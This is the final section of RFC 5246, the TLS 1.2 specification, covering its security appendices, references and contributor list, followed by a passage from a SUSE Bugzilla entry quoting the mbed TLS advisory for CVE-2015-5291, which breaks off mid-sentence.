   ClientHello.random and ServerHello.random values are hashed with the
   session's master_secret.  Provided that the master_secret has not
   been compromised and that the secure hash operations used to produce
   the encryption keys and MAC keys are secure, the connection should be
   secure and effectively independent from previous connections.
   Attackers cannot use known encryption keys or MAC secrets to
   compromise the master_secret without breaking the secure hash
   operations.

   Sessions cannot be resumed unless both the client and server agree.
   If either party suspects that the session may have been compromised,
   or that certificates may have expired or been revoked, it should
   force a full handshake.  An upper limit of 24 hours is suggested for
   session ID lifetimes, since an attacker who obtains a master_secret
   may be able to impersonate the compromised party until the
   corresponding session ID is retired.  Applications that may be run in
   relatively insecure environments should not write session IDs to
   stable storage.

[F.2](#appendix-F.2).  Protecting Application Data

   The master_secret is hashed with the ClientHello.random and
   ServerHello.random to produce unique data encryption keys and MAC
   secrets for each connection.

   Outgoing data is protected with a MAC before transmission.  To
   prevent message replay or modification attacks, the MAC is computed
   from the MAC key, the sequence number, the message length, the

Dierks & Rescorla           Standards Track                    [Page 94]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   message contents, and two fixed character strings.  The message type
   field is necessary to ensure that messages intended for one TLS
   record layer client are not redirected to another.  The sequence
   number ensures that attempts to delete or reorder messages will be
   detected.  Since sequence numbers are 64 bits long, they should never
   overflow.  Messages from one party cannot be inserted into the
   other's output, since they use independent MAC keys.  Similarly, the
   server write and client write keys are independent, so stream cipher
   keys are used only once.

   If an attacker does break an encryption key, all messages encrypted
   with it can be read.  Similarly, compromise of a MAC key can make
   message-modification attacks possible.  Because MACs are also
   encrypted, message-alteration attacks generally require breaking the
   encryption algorithm as well as the MAC.

   Note: MAC keys may be larger than encryption keys, so messages can
   remain tamper resistant even if encryption keys are broken.

[F.3](#appendix-F.3).  Explicit IVs

   [CBCATT] describes a chosen plaintext attack on TLS that depends on
   knowing the IV for a record.  Previous versions of TLS [[TLS1.0](#ref-TLS1.0)] used
   the CBC residue of the previous record as the IV and therefore
   enabled this attack.  This version uses an explicit IV in order to
   protect against this attack.

[F.4](#appendix-F.4).  Security of Composite Cipher Modes

   TLS secures transmitted application data via the use of symmetric
   encryption and authentication functions defined in the negotiated
   cipher suite.  The objective is to protect both the integrity and
   confidentiality of the transmitted data from malicious actions by
   active attackers in the network.  It turns out that the order in
   which encryption and authentication functions are applied to the data
   plays an important role for achieving this goal [[ENCAUTH](#ref-ENCAUTH)].

   The most robust method, called encrypt-then-authenticate, first
   applies encryption to the data and then applies a MAC to the
   ciphertext.  This method ensures that the integrity and
   confidentiality goals are obtained with ANY pair of encryption and
   MAC functions, provided that the former is secure against chosen
   plaintext attacks and that the MAC is secure against chosen-message
   attacks.  TLS uses another method, called authenticate-then-encrypt,
   in which first a MAC is computed on the plaintext and then the
   concatenation of plaintext and MAC is encrypted.  This method has
   been proven secure for CERTAIN combinations of encryption functions
   and MAC functions, but it is not guaranteed to be secure in general.

Dierks & Rescorla           Standards Track                    [Page 95]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   In particular, it has been shown that there exist perfectly secure
   encryption functions (secure even in the information-theoretic sense)
   that combined with any secure MAC function, fail to provide the
   confidentiality goal against an active attack.  Therefore, new cipher
   suites and operation modes adopted into TLS need to be analyzed under
   the authenticate-then-encrypt method to verify that they achieve the
   stated integrity and confidentiality goals.

   Currently, the security of the authenticate-then-encrypt method has
   been proven for some important cases.  One is the case of stream
   ciphers in which a computationally unpredictable pad of the length of
   the message, plus the length of the MAC tag, is produced using a
   pseudorandom generator and this pad is exclusive-ORed with the
   concatenation of plaintext and MAC tag.  The other is the case of CBC
   mode using a secure block cipher.  In this case, security can be
   shown if one applies one CBC encryption pass to the concatenation of
   plaintext and MAC and uses a new, independent, and unpredictable IV
   for each new pair of plaintext and MAC.  In versions of TLS prior to
   1.1, CBC mode was used properly EXCEPT that it used a predictable IV
   in the form of the last block of the previous ciphertext.  This made
   TLS open to chosen plaintext attacks.  This version of the protocol
   is immune to those attacks.  For exact details in the encryption
   modes proven secure, see [[ENCAUTH](#ref-ENCAUTH)].

[F.5](#appendix-F.5).  Denial of Service

   TLS is susceptible to a number of denial-of-service (DoS) attacks.
   In particular, an attacker who initiates a large number of TCP
   connections can cause a server to consume large amounts of CPU for
   doing RSA decryption.  However, because TLS is generally used over
   TCP, it is difficult for the attacker to hide his point of origin if
   proper TCP SYN randomization is used [[SEQNUM](#ref-SEQNUM)] by the TCP stack.

   Because TLS runs over TCP, it is also susceptible to a number of DoS
   attacks on individual connections.  In particular, attackers can
   forge RSTs, thereby terminating connections, or forge partial TLS
   records, thereby causing the connection to stall.  These attacks
   cannot in general be defended against by a TCP-using protocol.
   Implementors or users who are concerned with this class of attack
   should use IPsec AH [[AH](#ref-AH)] or ESP [[ESP](#ref-ESP)].

[F.6](#appendix-F.6).  Final Notes

   For TLS to be able to provide a secure connection, both the client
   and server systems, keys, and applications must be secure.  In
   addition, the implementation must be free of security errors.

Dierks & Rescorla           Standards Track                    [Page 96]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   The system is only as strong as the weakest key exchange and
   authentication algorithm supported, and only trustworthy
   cryptographic functions should be used.  Short public keys and
   anonymous servers should be used with great caution.  Implementations
   and users must be careful when deciding which certificates and
   certificate authorities are acceptable; a dishonest certificate
   authority can do tremendous damage.

Normative References

   [AES]      National Institute of Standards and Technology,
              "Specification for the Advanced Encryption Standard (AES)"
              FIPS 197.  November 26, 2001.

   [3DES]     National Institute of Standards and Technology,
              "Recommendation for the Triple Data Encryption Algorithm
              (TDEA) Block Cipher", NIST Special Publication 800-67, May
              2004.

   [DSS]      NIST FIPS PUB 186-2, "Digital Signature Standard",
              National Institute of Standards and Technology, U.S.
              Department of Commerce, 2000.

   [HMAC]     Krawczyk, H., Bellare, M., and R. Canetti, "HMAC: Keyed-
              Hashing for Message Authentication", [RFC 2104](/doc/html/rfc2104), February
              1997.

   [MD5]      Rivest, R., "The MD5 Message-Digest Algorithm", [RFC 1321](/doc/html/rfc1321),
              April 1992.

   [PKCS1]    Jonsson, J. and B. Kaliski, "Public-Key Cryptography
              Standards (PKCS) #1: RSA Cryptography Specifications
              Version 2.1", [RFC 3447](/doc/html/rfc3447), February 2003.

   [PKIX]     Housley, R., Polk, W., Ford, W., and D. Solo, "Internet
              X.509 Public Key Infrastructure Certificate and
              Certificate Revocation List (CRL) Profile", [RFC 3280](/doc/html/rfc3280),
              April 2002.

   [SCH]      B. Schneier. "Applied Cryptography: Protocols, Algorithms,
              and Source Code in C, 2nd ed.", Published by John Wiley &
              Sons, Inc. 1996.

   [SHS]      NIST FIPS PUB 180-2, "Secure Hash Standard", National
              Institute of Standards and Technology, U.S. Department of
              Commerce, August 2002.

Dierks & Rescorla           Standards Track                    [Page 97]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   [REQ]      Bradner, S., "Key words for use in RFCs to Indicate
              Requirement Levels", [BCP 14](/doc/html/bcp14), [RFC 2119](/doc/html/rfc2119), March 1997.

   [RFC2434]  Narten, T. and H. Alvestrand, "Guidelines for Writing an
              IANA Considerations Section in RFCs", [BCP 26](/doc/html/bcp26), [RFC 2434](/doc/html/rfc2434),
              October 1998.

   [X680]     ITU-T Recommendation X.680 (2002) | ISO/IEC 8824-1:2002,
              Information technology - Abstract Syntax Notation One
              (ASN.1): Specification of basic notation.

   [X690]     ITU-T Recommendation X.690 (2002) | ISO/IEC 8825-1:2002,
              Information technology - ASN.1 encoding Rules:
              Specification of Basic Encoding Rules (BER), Canonical
              Encoding Rules (CER) and Distinguished Encoding Rules
              (DER).

Informative References

   [AEAD]     McGrew, D., "An Interface and Algorithms for Authenticated
              Encryption", [RFC 5116](/doc/html/rfc5116), January 2008.

   [AH]       Kent, S., "IP Authentication Header", [RFC 4302](/doc/html/rfc4302), December
              2005.

   [BLEI]     Bleichenbacher D., "Chosen Ciphertext Attacks against
              Protocols Based on RSA Encryption Standard PKCS #1" in
              Advances in Cryptology -- CRYPTO'98, LNCS vol. 1462,
              pages:  1-12, 1998.

   [CBCATT]   Moeller, B., "Security of CBC Ciphersuites in SSL/TLS:
              Problems and Countermeasures",
              [http://www.openssl.org/~bodo/tls-cbc.txt](https://www.openssl.org/~bodo/tls-cbc.txt).

   [CBCTIME]  Canvel, B., Hiltgen, A., Vaudenay, S., and M. Vuagnoux,
              "Password Interception in a SSL/TLS Channel", Advances in
              Cryptology -- CRYPTO 2003, LNCS vol. 2729, 2003.

   [CCM]      "NIST Special Publication 800-38C: The CCM Mode for
              Authentication and Confidentiality",
              [http://csrc.nist.gov/publications/nistpubs/800-38C/](http://csrc.nist.gov/publications/nistpubs/800-38C/SP800-38C.pdf)
              [SP800-38C.pdf](http://csrc.nist.gov/publications/nistpubs/800-38C/SP800-38C.pdf)

   [DES]      National Institute of Standards and Technology, "Data
              Encryption Standard (DES)", FIPS PUB 46-3, October 1999.

Dierks & Rescorla           Standards Track                    [Page 98]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   [DSS-3]    NIST FIPS PUB 186-3 Draft, "Digital Signature Standard",
              National Institute of Standards and Technology, U.S.
              Department of Commerce, 2006.

   [ECDSA]    American National Standards Institute, "Public Key
              Cryptography for the Financial Services Industry: The
              Elliptic Curve Digital Signature Algorithm (ECDSA)", ANS
              X9.62-2005, November 2005.

   [ENCAUTH]  Krawczyk, H., "The Order of Encryption and Authentication
              for Protecting Communications (Or: How Secure is SSL?)",
              Crypto 2001.

   [ESP]      Kent, S., "IP Encapsulating Security Payload (ESP)", [RFC](/doc/html/rfc4303)
              [4303](/doc/html/rfc4303), December 2005.

   [FI06]     Hal Finney, "Bleichenbacher's RSA signature forgery based
              on implementation error", ietf-openpgp@imc.org mailing
              list, 27 August 2006, [http://www.imc.org/ietf-openpgp/](http://www.imc.org/ietf-openpgp/mail-archive/msg14307.html)
              [mail-archive/msg14307.html](http://www.imc.org/ietf-openpgp/mail-archive/msg14307.html).

   [GCM]      Dworkin, M., NIST Special Publication 800-38D,
              "Recommendation for Block Cipher Modes of Operation:
              Galois/Counter Mode (GCM) and GMAC", November 2007.

   [IKEALG]   Schiller, J., "Cryptographic Algorithms for Use in the
              Internet Key Exchange Version 2 (IKEv2)", [RFC 4307](/doc/html/rfc4307),
              December 2005.

   [KEYSIZ]   Orman, H. and P. Hoffman, "Determining Strengths For
              Public Keys Used For Exchanging Symmetric Keys", [BCP 86](/doc/html/bcp86),
              [RFC 3766](/doc/html/rfc3766), April 2004.

   [KPR03]    Klima, V., Pokorny, O., Rosa, T., "Attacking RSA-based
              Sessions in SSL/TLS", <http://eprint.iacr.org/2003/052/>,
              March 2003.

   [MODP]     Kivinen, T. and M. Kojo, "More Modular Exponential (MODP)
              Diffie-Hellman groups for Internet Key Exchange (IKE)",
              [RFC 3526](/doc/html/rfc3526), May 2003.

   [PKCS6]    RSA Laboratories, "PKCS #6: RSA Extended Certificate
              Syntax Standard", version 1.5, November 1993.

   [PKCS7]    RSA Laboratories, "PKCS #7: RSA Cryptographic Message
              Syntax Standard", version 1.5, November 1993.

Dierks & Rescorla           Standards Track                    [Page 99]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   [RANDOM]   Eastlake, D., 3rd, Schiller, J., and S. Crocker,
              "Randomness Requirements for Security", [BCP 106](/doc/html/bcp106), [RFC 4086](/doc/html/rfc4086),
              June 2005.

   [RFC3749]  Hollenbeck, S., "Transport Layer Security Protocol
              Compression Methods", [RFC 3749](/doc/html/rfc3749), May 2004.

   [RFC4366]  Blake-Wilson, S., Nystrom, M., Hopwood, D., Mikkelsen, J.,
              and T. Wright, "Transport Layer Security (TLS)
              Extensions", [RFC 4366](/doc/html/rfc4366), April 2006.

   [RSA]      R. Rivest, A. Shamir, and L. M. Adleman, "A Method for
              Obtaining Digital Signatures and Public-Key
              Cryptosystems", Communications of the ACM, v. 21, n. 2,
              Feb 1978, pp. 120-126.

   [SEQNUM]   Bellovin, S., "Defending Against Sequence Number Attacks",
              [RFC 1948](/doc/html/rfc1948), May 1996.

   [SSL2]     Hickman, Kipp, "The SSL Protocol", Netscape Communications
              Corp., Feb 9, 1995.

   [SSL3]     A. Freier, P. Karlton, and P. Kocher, "The SSL 3.0
              Protocol", Netscape Communications Corp., Nov 18, 1996.

   [SUBGROUP] Zuccherato, R., "Methods for Avoiding the "Small-Subgroup"
              Attacks on the Diffie-Hellman Key Agreement Method for
              S/MIME", [RFC 2785](/doc/html/rfc2785), March 2000.

   [TCP]      Postel, J., "Transmission Control Protocol", STD 7, [RFC](/doc/html/rfc793)
              [793](/doc/html/rfc793), September 1981.

   [TIMING]   Boneh, D., Brumley, D., "Remote timing attacks are
              practical", USENIX Security Symposium 2003.

   [TLSAES]   Chown, P., "Advanced Encryption Standard (AES)
              Ciphersuites for Transport Layer Security (TLS)", [RFC](/doc/html/rfc3268)
              [3268](/doc/html/rfc3268), June 2002.

   [TLSECC]   Blake-Wilson, S., Bolyard, N., Gupta, V., Hawk, C., and B.
              Moeller, "Elliptic Curve Cryptography (ECC) Cipher Suites
              for Transport Layer Security (TLS)", [RFC 4492](/doc/html/rfc4492), May 2006.

   [TLSEXT]   Eastlake, D., 3rd, "Transport Layer Security (TLS)
              Extensions:  Extension Definitions", Work in Progress,
              February 2008.

Dierks & Rescorla           Standards Track                   [Page 100]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   [TLSPGP]   Mavrogiannopoulos, N., "Using OpenPGP Keys for Transport
              Layer Security (TLS) Authentication", [RFC 5081](/doc/html/rfc5081), November
              2007.

   [TLSPSK]   Eronen, P., Ed., and H. Tschofenig, Ed., "Pre-Shared Key
              Ciphersuites for Transport Layer Security (TLS)", [RFC](/doc/html/rfc4279)
              [4279](/doc/html/rfc4279), December 2005.

   [TLS1.0]   Dierks, T. and C. Allen, "The TLS Protocol Version 1.0",
              [RFC 2246](/doc/html/rfc2246), January 1999.

   [TLS1.1]   Dierks, T. and E. Rescorla, "The Transport Layer Security
              (TLS) Protocol Version 1.1", [RFC 4346](/doc/html/rfc4346), April 2006.

   [X501]     ITU-T Recommendation X.501: Information Technology - Open
              Systems Interconnection - The Directory: Models, 1993.

   [XDR]      Eisler, M., Ed., "XDR: External Data Representation
              Standard", STD 67, [RFC 4506](/doc/html/rfc4506), May 2006.

Working Group Information

   The discussion list for the IETF TLS working group is located at the
   e-mail address <tls@ietf.org>. Information on the group and
   information on how to subscribe to the list is at
   <<https://www1.ietf.org/mailman/listinfo/tls>>

   Archives of the list can be found at:
   <<http://www.ietf.org/mail-archive/web/tls/current/index.html>>

Contributors

   Christopher Allen (co-editor of TLS 1.0)
   Alacrity Ventures
   ChristopherA@AlacrityManagement.com

   Martin Abadi
   University of California, Santa Cruz
   abadi@cs.ucsc.edu

   Steven M. Bellovin
   Columbia University
   smb@cs.columbia.edu

   Simon Blake-Wilson
   BCI
   sblakewilson@bcisse.com

Dierks & Rescorla           Standards Track                   [Page 101]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   Ran Canetti
   IBM
   canetti@watson.ibm.com

   Pete Chown
   Skygate Technology Ltd
   pc@skygate.co.uk

   Taher Elgamal
   taher@securify.com
   Securify

   Pasi Eronen
   pasi.eronen@nokia.com
   Nokia

   Anil Gangolli
   anil@busybuddha.org

   Kipp Hickman

   Alfred Hoenes

   David Hopwood
   Independent Consultant
   david.hopwood@blueyonder.co.uk

   Phil Karlton (co-author of SSLv3)

   Paul Kocher (co-author of SSLv3)
   Cryptography Research
   paul@cryptography.com

   Hugo Krawczyk
   IBM
   hugo@ee.technion.ac.il

   Jan Mikkelsen
   Transactionware
   janm@transactionware.com

   Magnus Nystrom
   RSA Security
   magnus@rsasecurity.com

   Robert Relyea
   Netscape Communications
   relyea@netscape.com

Dierks & Rescorla           Standards Track                   [Page 102]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   Jim Roskind
   Netscape Communications
   jar@netscape.com

   Michael Sabin

   Dan Simon
   Microsoft, Inc.
   dansimon@microsoft.com

   Tom Weinstein

   Tim Wright
   Vodafone
   timothy.wright@vodafone.com

Editors' Addresses

   Tim Dierks
   Independent
   EMail: tim@dierks.org

   Eric Rescorla
   RTFM, Inc.
   EMail: ekr@rtfm.com

Dierks & Rescorla           Standards Track                   [Page 103]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

Full Copyright Statement

   Copyright (C) The IETF Trust (2008).

   This document is subject to the rights, licenses and restrictions
   contained in [BCP 78](/doc/html/bcp78), and except as set forth therein, the authors
   retain all their rights.

   This document and the information contained herein are provided on an
   "AS IS" basis and THE CONTRIBUTOR, THE ORGANIZATION HE/SHE REPRESENTS
   OR IS SPONSORED BY (IF ANY), THE INTERNET SOCIETY, THE IETF TRUST AND
   THE INTERNET ENGINEERING TASK FORCE DISCLAIM ALL WARRANTIES, EXPRESS
   OR IMPLIED, INCLUDING BUT NOT LIMITED TO ANY WARRANTY THAT THE USE OF
   THE INFORMATION HEREIN WILL NOT INFRINGE ANY RIGHTS OR ANY IMPLIED
   WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE.

Intellectual Property

   The IETF takes no position regarding the validity or scope of any
   Intellectual Property Rights or other rights that might be claimed to
   pertain to the implementation or use of the technology described in
   this document or the extent to which any license under such rights
   might or might not be available; nor does it represent that it has
   made any independent effort to identify any such rights.  Information
   on the procedures with respect to rights in RFC documents can be
   found in [BCP 78](/doc/html/bcp78) and [BCP 79](/doc/html/bcp79).

   Copies of IPR disclosures made to the IETF Secretariat and any
   assurances of licenses to be made available, or the result of an
   attempt made to obtain a general license or permission for the use of
   such proprietary rights by implementers or users of this
   specification can be obtained from the IETF on-line IPR repository at
   <http://www.ietf.org/ipr>.

   The IETF invites any interested party to bring to its attention any
   copyrights, patents or patent applications, or other proprietary
   rights that may cover technology that may be required to implement
   this standard.  Please address the information to the IETF at
   ietf-ipr@ietf.org.

Dierks & Rescorla           Standards Track                   [Page 104]

```

[Datatracker](/doc/rfc5246/)

RFC 5246

RFC
- Proposed Standard

* Info
* Contents
* Prefs

| Document | Document type |  | RFC - Proposed Standard  August 2008  [View errata](https://www.rfc-editor.org/errata_search.php?rfc=5246 "Click to view errata.") [Report errata](https://www.rfc-editor.org/errata.php#reportnew "Click to report an error in the document.") [IPR](/ipr/search/?submit=draft&id=rfc5246 "Click to view IPR declarations.") Obsoleted by [RFC 8446](/doc/html/rfc8446 "The Transport Layer Security (TLS) Protocol Version 1.3") Updated by [RFC 7627](/doc/html/rfc7627 "Transport Layer Security (TLS) Session Hash and Extended Master Secret Extension"), [RFC 9155](/doc/html/rfc9155 "Deprecating MD5 and SHA-1 Signature Hashes in TLS 1.2 and DTLS 1.2"), [RFC 5878](/doc/html/rfc5878 "Transport Layer Security (TLS) Authorization Extensions"), [RFC 5746](/doc/html/rfc5746 "Transport Layer Security (TLS) Renegotiation Indication Extension"), [RFC 6176](/doc/html/rfc6176 "Prohibiting Secure Sockets Layer (SSL) Version 2.0"), [RFC 7465](/doc/html/rfc7465 "Prohibiting RC4 Cipher Suites"), [RFC 7507](/doc/html/rfc7507 "TLS Fallback Signaling Cipher Suite Value (SCSV) for Preventing Protocol Downgrade Attacks"), [RFC 7568](/doc/html/rfc7568 "Deprecating Secure Sockets Layer Version 3.0"), [RFC 7685](/doc/html/rfc7685 "A Transport Layer Security (TLS) ClientHello Padding Extension"), [RFC 7905](/doc/html/rfc7905 "ChaCha20-Poly1305 Cipher Suites for Transport Layer Security (TLS)"), [RFC 7919](/doc/html/rfc7919 "Negotiated Finite Field Diffie-Hellman Ephemeral Parameters for Transport Layer Security (TLS)"), [RFC 8447](/doc/html/rfc8447 "IANA Registry Updates for TLS and DTLS") Obsoletes [RFC 4346](/doc/html/rfc4346 "The Transport Layer Security (TLS) Protocol Version 1.1"), [RFC 4366](/doc/html/rfc4366 "Transport Layer Security (TLS) Extensions"), [RFC 3268](/doc/html/rfc3268 "Advanced Encryption Standard (AES) Ciphersuites for Transport Layer Security (TLS)") Updates [RFC 4492](/doc/html/rfc4492 "Elliptic Curve Cryptography (ECC) Cipher Suites for Transport Layer Security (TLS)") Was [draft-ietf-tls-rfc4346-bis](/doc/draft-ietf-tls-rfc4346-bis/10/) ([tls WG](/wg/tls/about/)) |
| --- | --- | --- | --- |
|  | Select version |  | * [10](/doc/html/draft-ietf-tls-rfc4346-bis-10) * [RFC 5246](/doc/html/rfc5246) |
|  | Compare versions |  | RFC 5246  draft-ietf-tls-rfc4346-bis-10  draft-ietf-tls-rfc4346-bis-09  draft-ietf-tls-rfc4346-bis-08  draft-ietf-tls-rfc4346-bis-07  draft-ietf-tls-rfc4346-bis-06  draft-ietf-tls-rfc4346-bis-05  draft-ietf-tls-rfc4346-bis-04  draft-ietf-tls-rfc4346-bis-03  draft-ietf-tls-rfc4346-bis-02  draft-ietf-tls-rfc4346-bis-01  draft-ietf-tls-rfc4346-bis-00   RFC 5246  draft-ietf-tls-rfc4346-bis-10  draft-ietf-tls-rfc4346-bis-09  draft-ietf-tls-rfc4346-bis-08  draft-ietf-tls-rfc4346-bis-07  draft-ietf-tls-rfc4346-bis-06  draft-ietf-tls-rfc4346-bis-05  draft-ietf-tls-rfc4346-bis-04  draft-ietf-tls-rfc4346-bis-03  draft-ietf-tls-rfc4346-bis-02  draft-ietf-tls-rfc4346-bis-01  draft-ietf-tls-rfc4346-bis-00   Side-by-side  Inline |
|  | Authors |  | [Eric Rescorla](/person/ekr%40rtfm.com "Datatracker profile of Eric Rescorla") , [Tim Dierks](/person/tim%40dierks.org "Datatracker profile of Tim Dierks")   Email authors |
|  | RFC stream |  | IETF Logo IETF Logo |
|  | Other formats |  | [txt](https://www.rfc-editor.org/rfc/rfc5246.txt) [html](https://www.rfc-editor.org/rfc/rfc5246.html) [pdf](https://www.rfc-editor.org/rfc/pdfrfc/rfc5246.txt.pdf) [w/errata](https://www.rfc-editor.org/rfc/inline-errata/rfc5246.html) [bibtex](/doc/rfc5246/bibtex/) |
|  | Additional resources |  | [Mailing list discussion](https://mailarchive.ietf.org/arch/browse/tls/?q=rfc5246 OR %22draft-ietf-tls-rfc4346-bis%22) |

[Report a datatracker bug](https://github.com/ietf-tools/datatracker/issues/new/choose)

Show sidebar by default

Yes

No

Tab to show by default

Info

Contents

HTMLization configuration

HTMLize the plaintext

Plaintextify the HTML

Maximum font size

Page dependencies

Inline

Reference

Citation links

 Go to reference section

Go to linked document

![](//analytics.ietf.org/piwik.php?idsite=7)



=== Content from bugzilla.suse.com_b109388e_20250126_093437.html ===


| Bugzilla – Bug 949380 | VUL-0: CVE-2015-5291: mbedtls, polarssl: remote code execution via session tickets or SNI | Last modified: 2015-12-27 00:12:42 UTC |
| --- | --- | --- |

|  |
| --- |

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D949380)
* |
  [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

[**Bug 949380**](show_bug.cgi?id=949380)
(CVE-2015-5291)
- VUL-0: CVE-2015-5291: mbedtls, polarssl: remote code execution via session tickets or SNI

[Summary:](page.cgi?id=glossary.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
VUL-0: CVE-2015-5291: mbedtls, polarssl: remote code execution via session ti...

| | [Status](page.cgi?id=status_resolution_matrix.html): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=glossary.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2015-5291 | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | SUSE Security Incidents | | [Classification:](page.cgi?id=glossary.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Novell Products | | [Component:](describecomponents.cgi?product=SUSE Security Incidents "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Incidents ([show other bugs](buglist.cgi?component=Incidents&product=SUSE%20Security%20Incidents&bug_status=__open__)) | | [Version:](page.cgi?id=glossary.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=glossary.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Other openSUSE 42.1 | |  | | | [Priority](page.cgi?id=glossary.html#priority): | P3 - Medium **Severity**: Critical | | [Target Milestone:](page.cgi?id=glossary.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=glossary.html#assigned_to "The person in charge of resolving the bug.") | Security Team bot | | [QA Contact:](page.cgi?id=glossary.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | Security Team bot | |  | | | [URL:](page.cgi?id=glossary.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=glossary.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=glossary.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=glossary.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2015-10-08 06:42 UTC by Marcus Meissner | | --- | --- | | Modified: | 2015-12-27 00:12 UTC ([History](show_activity.cgi?id=949380)) | | CC List: | 4 users (show)  astieger fisiu jsegitz mpluskal | |  | | | [See Also:](page.cgi?id=glossary.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Found By:](page.cgi?id=glossary.html#cf_foundby "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Services Priority:](page.cgi?id=glossary.html#cf_nts_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Business Priority:](page.cgi?id=glossary.html#cf_biz_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Blocker:](page.cgi?id=glossary.html#cf_blocker "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Marketing QA Status:](page.cgi?id=glossary.html#cf_marketing_qa_status "A custom Drop Down field in this installation of Bugzilla.") | --- | | [IT Deployment:](page.cgi?id=glossary.html#cf_it_deployment "A custom Drop Down field in this installation of Bugzilla.") | --- | |  | |  * [Clone This Bug](enter_bug.cgi?cloned_bug_id=949380) |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [**proposed backport**](attachment.cgi?id=659108 "View the content of the attachment") (9.67 KB, patch)  [2015-12-13 19:33 UTC](#attach_659108 "Go to the comment associated with the attachment"), Andreas Stieger | [Details](attachment.cgi?id=659108&action=edit) | [Diff](attachment.cgi?id=659108&action=diff) | | [View All](attachment.cgi?bugid=949380&action=viewall)  [Add an attachment](attachment.cgi?bugid=949380&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=949380&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=949380#c0)  Marcus Meissner   2015-10-08 06:42:14 UTC  ``` <https://tls.mbed.org/tech-updates/security-advisories/mbedtls-security-advisory-2015-01>  CVE 	CVE-2015-5291 Date 	5th of October 2015 Affects 	PolarSSL 1.0 and up Not affected 	PolarSSL 1.2.17 and up, mbed TLS 1.3.14 and up, mbed TLS 2.1.2 and up and any version with clients not using session tickets nor accepting hostnames from untrusted parties Impact 	Denial of service and possible remote code execution Severity 	High Exploit 	Withheld  PolarSSL versions starting with 1.0 and up to the PolarSSL 1.2.16, mbed TLS 1.3.13 and mbed TLS 2.1.1 releases are affected by a remote attack in their default configuration in some use cases.  This vulnerability was discovered by Guido Vranken of Intelworks.  This Security Advisory describes the vulnerability, impact and fix for the attack. Vulnerability  When the client creates its ClientHello message, due to insufficient bounds checking it can overflow the heap-based buffer containing the message while writing some extensions. Two extensions in particular could be used by a remote attacker to trigger the overflow: the session ticket extension and the server name indication (SNI) extension.  Starting with PolarSSL 1.3.0 which added support for session tickets, any server the client connects to can send an overlong session ticket which will cause a buffer overflow if and when the client attempts to resume the connection with the server. Clients that disabled session tickets or never attempt to reconnect to a server using a saved session are not vulnerable to this attack vector.  Starting with PolarSSL 1.0.0, this overflow could also be triggered by an attacker convincing a client to use an overlong hostname for the SNI extension. The hostname needs to be almost as long at SSL_MAX_CONTENT_LEN, which as 16KB by default, but could be smaller if a custom configuration is used. Clients that do not accept hostnames from unstrusted parties are not vulnerable to this attack vector. Impact  Depending on the implementation of the memory allocator, this could result in a Denial of Service (client crash) or a possible Remote Code Execution.  Servers are not affected in any version. Resolution  Upgrade to PolarSSL 1.2.17, mbed TLS 1.3.14 or mbed TLS 2.1.2. If you can't, use the 